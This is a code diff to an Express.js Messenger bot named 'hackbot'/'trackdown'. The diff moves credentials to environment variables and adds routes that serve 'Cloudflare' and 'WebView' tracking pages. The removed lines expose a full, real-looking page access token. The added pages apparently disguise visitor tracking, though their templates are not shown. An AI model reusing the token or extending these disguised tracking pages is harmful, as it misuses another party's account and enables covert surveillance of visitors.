@@ -7,9 +7,16 @@ const app = express();
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-const PAGE_ACCESS_TOKEN = "EAAUG0iogqEYBOyZCbO8SQ1d9f8KDfku3pan9Ok5lA1u56ZBycol5n4me74zsRNJO8wh8fiTgw1ejZCDxZBknhHwiz7MaxSZCcV8nNbYYCi4Ijutlg6IcLXnAvLdwpbnIA1AO6giyGtQZBweho42RNB13IzLUOHyualEjU31CkpXjJiVurFsWEZCL7ntNveeBHjkUgZDZD";
-const VERIFY_TOKEN = "hackbot";
+const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN || "your_page_access_token_here";
+const VERIFY_TOKEN = process.env.VERIFY_TOKEN || "hackbot";
 const hostURL = "https://trackdown-efzv.onrender.com/webhook"; // Replace with your URL
+
+// Set EJS as the view engine
+app.set("view engine", "ejs");
+app.set("views", "./views"); // Assuming "views" is the folder where cloudflare.ejs and webview.ejs are stored
+
+// Serve static files if needed
+app.use(express.static("public"));
 
 // Track users awaiting URL input
 const userStates = {};
@@ -59,7 +66,7 @@ function handleMessage(senderId, receivedMessage) {
     // Check if the user is expected to enter a URL
     if (userStates[senderId] === "awaiting_url") {
         const url = receivedMessage.text;
-        
+
         // Validate URL (simple check, can be improved)
         if (url.startsWith("http://") || url.startsWith("https://")) {
             response = { text: `URL received: ${url}` };
@@ -113,8 +120,25 @@ function callSendAPI(senderId, response) {
         .catch((err) => console.error("Error sending message:", err));
 }
 
-// Start the server
-app.listen(5000, () => {
-    console.log("Server is running on port 5000");
+// Route to render cloudflare.ejs
+app.get("/cloudflare", (req, res) => {
+    res.render("cloudflare", {
+        title: "Cloudflare Page",
+        description: "This is the Cloudflare tracking page."
+    });
 });
-            
+
+// Route to render webview.ejs
+app.get("/webview", (req, res) => {
+    res.render("webview", {
+        title: "Webview Page",
+        content: "This is the WebView tracking page."
+    });
+});
+
+// Start the server
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
+        
